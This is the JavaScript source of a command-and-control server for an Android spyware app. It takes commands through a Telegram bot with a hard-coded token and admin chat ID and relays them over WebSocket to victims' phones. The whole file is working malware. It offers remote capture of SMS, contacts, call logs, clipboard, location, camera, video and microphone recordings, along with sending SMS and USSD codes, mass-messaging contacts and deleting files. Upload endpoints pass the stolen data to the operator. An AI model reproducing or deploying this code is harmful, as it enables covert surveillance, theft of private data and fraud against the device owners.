'use strict';

const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const axios = require('axios');

const TOKEN    = process.env.BOT_TOKEN || '8774952859:AAGiNvC0kaqgCT2_m8zoc7w2NvVXgT_wvfc';
const ADMIN    = String(process.env.CHAT_ID || '9216137492');
const PING_URL = process.env.PING_URL || 'https://www.google.com';
const PORT     = process.env.PORT || 8999;

const app    = express();
const server = http.createServer(app);
const wss    = new WebSocketServer({ server });
const bot    = new TelegramBot(TOKEN, { polling: true });
const upload = multer({ limits: { fileSize: 60 * 1024 * 1024 } });

const clients = new Map();
const pending = new Map();

app.use(express.json({ limit: '2mb' }));

bot.on('polling_error', (e) => console.log('POLLING_ERROR', e.code, e.message));
bot.on('error', (e) => console.log('BOT_ERROR', e.message));
process.on('uncaughtException', (e) => console.log('UNCAUGHT', e.message));
process.on('unhandledRejection', (e) => console.log('REJECTION', e && e.message));
process.on('SIGTERM', () => { bot.stopPolling().catch(() => {}); server.close(); process.exit(0); });

const esc = (v) => String(v ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
const safe = (fn) => (req, res) => Promise.resolve(fn(req, res)).catch((e) => {
  console.log('HTTP_ERROR', e.message);
  if (!res.headersSent) res.status(500).send('error');
});

function sendTo(uuid, payload) {
  const c = clients.get(uuid);
  if (!c) return false;
  if (c.socket.readyState !== 1) { clients.delete(uuid); return false; }
  c.socket.send(payload);
  console.log('->', uuid.slice(0, 4), payload);
  return true;
}

function onlyUuid() {
  if (clients.size === 1) return [...clients.keys()][0];
  return null;
}

function deviceCard(d) {
  return [
    '• 𝗗𝗲𝘃𝗶𝗰𝗲 𝗺𝗼𝗱𝗲𝗹 : <b>' + esc(d.model) + '</b>',
    '• 𝗯𝗮𝘁𝘁𝗲𝗿𝘆 : <b>' + esc(d.battery) + '</b>',
    '• 𝗮𝗻𝗱𝗿𝗼𝗶𝗱 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 : <b>' + esc(d.version) + '</b>',
    '• 𝘀𝗰𝗿𝗲𝗲𝗻 𝗯𝗿𝗶𝗴𝗵𝘁𝗻𝗲𝘀𝘀 : <b>' + esc(d.brightness) + '</b>',
    '• 𝗽𝗿𝗼𝘃𝗶𝗱𝗲𝗿 : <b>' + esc(d.provider) + '</b>',
  ].join('\n');
}

const mainKeyboard = {
  reply_markup: {
    keyboard: [['Connection device'], ['Execute command']],
    resize_keyboard: true,
  },
};

const NO_DEVICE = '• 𝗡𝗼 𝗱𝗲𝘃𝗶𝗰𝗲 𝗶𝘀 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱\n\n• 𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘁𝗵𝗲 𝗮𝗽𝗽𝗹𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗶𝘀 𝗶𝗻𝘀𝘁𝗮𝗹𝗹𝗲𝗱 𝗼𝗻 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗱𝗲𝘃𝗶𝗰𝗲';
const BUSY     = '• 𝗦𝗼𝘂𝗿 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝗶𝘀 𝗼𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀\n\n• 𝗬𝗼𝘂 𝘄𝗶𝗹𝗹 𝗿𝗲𝗰𝗲𝗶𝘃𝗲 𝗮 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗲 𝗶𝗻 𝘁𝗵𝗲 𝗻𝗲𝘅𝘁 𝗳𝗲𝘄 𝗺𝗼𝗺𝗲𝗻𝘁𝘀';

const ACTIONS = {
  apps:                { label: '𝗔𝗽𝗽𝘀' },
  device_info:         { label: '𝗗𝗲𝘃𝗶𝗰𝗲 𝗶𝗻𝗳𝗼' },
  clipboard:           { label: '𝗖𝗹𝗶𝗽𝗯𝗼𝗮𝗿𝗱' },
  camera_main:         { label: '𝗠𝗮𝗶𝗻 𝗰𝗮𝗺𝗲𝗿𝗮' },
  camera_selfie:       { label: '𝗦𝗲𝗹𝗳𝗶𝗲 𝗰𝗮𝗺𝗲𝗿𝗮' },
  location:            { label: '𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻' },
  vibrate:             { label: '𝗩𝗶𝗯𝗿𝗮𝘁𝗲' },
  messages:            { label: '𝗠𝗲𝘀𝘀𝗮𝗴𝗲𝘀' },
  contacts:            { label: '𝗖𝗼𝗻𝘁𝗮𝗰𝘁𝘀' },
  calls:               { label: '𝗖𝗮𝗹𝗹𝘀' },
  send_message:        { label: '𝗦𝗲𝗻𝗱 𝗦𝗠𝗦', ask: 'number' },
  send_ussd:           { label: '𝗦𝗲𝗻𝗱 𝗨𝗦𝗦𝗗', ask: 'code' },
  send_message_to_all: { label: '𝗦𝗲𝗻𝗱 𝗮𝗹𝗹', ask: 'message' },
  toast:               { label: '𝗧𝗼𝗮𝘀𝘁', ask: 'message' },
  show_notification:   { label: '𝗡𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻', ask: 'title' },
  play_audio:          { label: '𝗣𝗹𝗮𝘆 𝗮𝘂𝗱𝗶𝗼', ask: 'path' },
  stop_audio:          { label: '𝗦𝘁𝗼𝗽 𝗮𝘂𝗱𝗶𝗼' },
  delete_file:         { label: '𝗗𝗲𝗹𝗲𝘁𝗲 𝗳𝗶𝗹𝗲', ask: 'path' },
  files:               { label: '𝗙𝗶𝗹𝗲𝘀', ask: 'path' },
  microphone:          { label: '𝗠𝗶𝗰𝗿𝗼𝗽𝗵𝗼𝗻𝗲', ask: 'duration' },
  rec_camera_main:     { label: '𝗥𝗲𝗰 𝗰𝗮𝗺𝗲𝗿𝗮 𝗺𝗮𝗶𝗻', ask: 'duration' },
  rec_camera_selfie:   { label: '𝗥𝗲𝗰 𝗰𝗮𝗺𝗲𝗿𝗮 𝘀𝗲𝗹𝗳𝗶𝗲', ask: 'duration' },
};

const ASK = {
  number:   ['• 𝗥𝗲𝗽𝗹𝘆 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿:', '• 𝗡𝗼𝘄 𝗲𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲:'],
  code:     ['• 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗨𝗦𝗦𝗗 𝗰𝗼𝗱𝗲:'],
  message:  ['• 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲:'],
  title:    ['• 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝘁𝗶𝘁𝗹𝗲:', '• 𝗡𝗼𝘄 𝗲𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗹𝗶𝗻𝗸:'],
  path:     ['• 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗽𝗮𝘁𝗵 (𝗲.𝗴. 𝗗𝗖𝗜𝗠/𝗖𝗮𝗺𝗲𝗿𝗮):'],
  duration: ['• 𝗘𝗻𝘁𝗲𝗿 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀:'],
};

function actionKeyboard(uuid) {
  const keys = Object.keys(ACTIONS);
  const rows = [];
  for (let i = 0; i < keys.length; i += 2) {
    rows.push(keys.slice(i, i + 2).map((k) => ({ text: ACTIONS[k].label, callback_data: k + ':' + uuid })));
  }
  return { inline_keyboard: rows };
}

/* ---------- http ---------- */

app.get('/', (req, res) => res.send('<h1 align="center">𝗞𝗮𝗻𝘁𝗮𝗿 𝗦𝗽𝗹𝗮𝘆 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆</h1>'));
app.get('/health', (req, res) => res.json({ ok: true, clients: clients.size }));

app.post('/uploadFile', upload.single('file'), safe(async (req, res) => {
  if (!req.file) return res.status(400).send('no file');
  await bot.sendDocument(ADMIN, req.file.buffer, {
    caption: '• 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗳𝗿𝗼𝗺 <b>' + esc(req.headers.model) + '</b> 𝗱𝗲𝘃𝗶𝗰𝗲',
    parse_mode: 'HTML',
  }, { filename: req.file.originalname, contentType: req.file.mimetype });
  res.send('');
}));

app.post('/uploadText', safe(async (req, res) => {
  await bot.sendMessage(ADMIN, '• 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗳𝗿𝗼𝗺 <b>' + esc(req.headers.model) + '</b> 𝗱𝗲𝘃𝗶𝗰𝗲\n\n' + esc(req.body.text), { parse_mode: 'HTML' });
  res.send('');
}));

app.post('/uploadLocation', safe(async (req, res) => {
  await bot.sendLocation(ADMIN, req.body.lat, req.body.lon);
  await bot.sendMessage(ADMIN, '• 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 <b>' + esc(req.headers.model) + '</b> 𝗱𝗲𝘃𝗶𝗰𝗲', { parse_mode: 'HTML' });
  res.send('');
}));

/* ---------- ws ---------- */

wss.on('connection', (ws, req) => {
  const uuid = uuidv4();
  const h = req.headers;
  ws.uuid = uuid;
  clients.set(uuid, {
    socket: ws,
    model: h.model || 'unknown',
    battery: h.battery || '?',
    version: h.version || '?',
    brightness: h.brightness || '?',
    provider: h.provider || '?',
  });
  console.log('CONNECTED', uuid.slice(0, 4), h.model, 'total=' + clients.size);

  const card = deviceCard(clients.get(uuid));
  bot.sendMessage(ADMIN, '• 𝗡𝗲𝘄 𝗱𝗲𝘃𝗶𝗰𝗲 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱\n\n' + card, { parse_mode: 'HTML' })
    .catch((e) => console.log('SEND_ERR', e.message));

  ws.on('message', (d) => console.log('<-', uuid.slice(0, 4), String(d).slice(0, 120)));

  ws.on('close', () => {
    clients.delete(uuid);
    console.log('CLOSED', uuid.slice(0, 4), 'total=' + clients.size);
    bot.sendMessage(ADMIN, '• 𝗗𝗲𝘃𝗶𝗰𝗲 𝗱𝗶𝘀𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱\n\n' + card, { parse_mode: 'HTML' })
      .catch((e) => console.log('SEND_ERR', e.message));
  });

  ws.on('error', (e) => console.log('WS_ERROR', e.message));
});

/* ---------- callbacks ---------- */

bot.on('callback_query', safe(async (query) => {
  const msg = query.message;
  const chatId = String(msg.chat.id);
  await bot.answerCallbackQuery(query.id).catch(() => {});
  if (chatId !== ADMIN) return;

  const [action, uuid] = String(query.data).split(':');
  if (!uuid) return;

  if (action === 'device') {
    const c = clients.get(uuid);
    if (!c) return bot.sendMessage(chatId, NO_DEVICE, mainKeyboard);
    return bot.editMessageText(deviceCard(c), {
      chat_id: chatId,
      message_id: msg.message_id,
      parse_mode: 'HTML',
      reply_markup: actionKeyboard(uuid),
    }).catch(() => bot.sendMessage(chatId, deviceCard(c), { parse_mode: 'HTML', reply_markup: actionKeyboard(uuid) }));
  }

  const def = ACTIONS[action];
  if (!def) return;
  if (!clients.has(uuid)) return bot.sendMessage(chatId, NO_DEVICE, mainKeyboard);

  if (!def.ask) {
    sendTo(uuid, action + ':' + uuid);
    await bot.deleteMessage(chatId, msg.message_id).catch(() => {});
    return bot.sendMessage(chatId, BUSY, mainKeyboard);
  }

  pending.set(chatId, { uuid, action, stage: 0, at: Date.now() });
  await bot.deleteMessage(chatId, msg.message_id).catch(() => {});
  return bot.sendMessage(chatId, ASK[def.ask][0], { reply_markup: { force_reply: true } });
}));

/* ---------- messages ---------- */

bot.on('message', safe(async (msg) => {
  const chatId = String(msg.chat.id);
  const text = (msg.text || '').trim();
  const low = text.toLowerCase();

  console.log('IN', chatId, JSON.stringify(text), 'reply=' + !!msg.reply_to_message);

  if (chatId !== ADMIN) return bot.sendMessage(chatId, '• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁');

  /* --- 1. buttons & global commands ALWAYS win --- */
  if (low === '/start' || low === 'start' || low === 'execute command' || low === '/menu') {
    pending.delete(chatId);
    return bot.sendMessage(chatId, '• 𝗖𝗵𝗼𝗼𝘀𝗲 𝗮 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗲 𝗹𝗶𝘀𝘁 𝗯𝗲𝗹𝗼𝘄', mainKeyboard);
  }

  if (low === 'connection device' || low === '/devices') {
    pending.delete(chatId);
    if (clients.size === 0) return bot.sendMessage(chatId, NO_DEVICE, mainKeyboard);
    const one = onlyUuid();
    if (one) {
      return bot.sendMessage(chatId, deviceCard(clients.get(one)), {
        parse_mode: 'HTML',
        reply_markup: actionKeyboard(one),
      });
    }
    const rows = [...clients.entries()].map(([u, c]) => ([{ text: c.model + ' · ' + u.slice(0, 4), callback_data: 'device:' + u }]));
    return bot.sendMessage(chatId, '• 𝗦𝗲𝗹𝗲𝗰𝘁 𝘁𝗵𝗲 𝗱𝗲𝘃𝗶𝗰𝗲', { reply_markup: { inline_keyboard: rows } });
  }

  if (low === '/status') {
    const list = [...clients.entries()].map(([u, c]) => '• ' + esc(c.model) + ' · ' + u.slice(0, 4) + ' · batt ' + esc(c.battery));
    return bot.sendMessage(chatId, '• 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 : <b>' + clients.size + '</b>\n\n' + (list.join('\n') || '—'), { parse_mode: 'HTML' });
  }

  if (low === '/cancel') {
    pending.delete(chatId);
    return bot.sendMessage(chatId, '• 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱', mainKeyboard);
  }

  /* --- 2. reply flows --- */
  if (pending.has(chatId)) {
    const flow = pending.get(chatId);
    if (Date.now() - flow.at > 5 * 60 * 1000) {
      pending.delete(chatId);
    } else {
      const def = ACTIONS[flow.action];
      const steps = ASK[def.ask] || [];

      if (flow.stage === 0 && steps.length > 1) {
        if (flow.action === 'send_message') flow.number = text;
        if (flow.action === 'show_notification') flow.title = text;
        flow.stage = 1;
        flow.at = Date.now();
        pending.set(chatId, flow);
        return bot.sendMessage(chatId, steps[1], { reply_markup: { force_reply: true } });
      }

      pending.delete(chatId);

      let payload;
      if (flow.action === 'send_message') payload = 'send_message:' + flow.number + '/' + text;
      else if (flow.action === 'show_notification') payload = 'show_notification:' + flow.title + '/' + text;
      else payload = flow.action + ':' + flow.uuid + '/' + text;

      if (!sendTo(flow.uuid, payload)) return bot.sendMessage(chatId, NO_DEVICE, mainKeyboard);
      return bot.sendMessage(chatId, BUSY, mainKeyboard);
    }
  }

  /* --- 3. unknown --- */
  return bot.sendMessage(chatId, '• 𝗨𝗻𝗸𝗻𝗼𝘄𝗻 𝗰𝗼𝗺𝗺𝗮𝗻𝗱\n\n• 𝗦𝗲𝗻𝗱 /start', mainKeyboard);
}));

setInterval(() => {
  for (const [uuid, c] of clients) {
    if (c.socket.readyState === 1) c.socket.send('ping');
    else clients.delete(uuid);
  }
  axios.get(PING_URL, { timeout: 8000 }).catch(() => {});
}, 15000);

server.listen(PORT, '0.0.0.0', () => console.log('listening on ' + PORT));
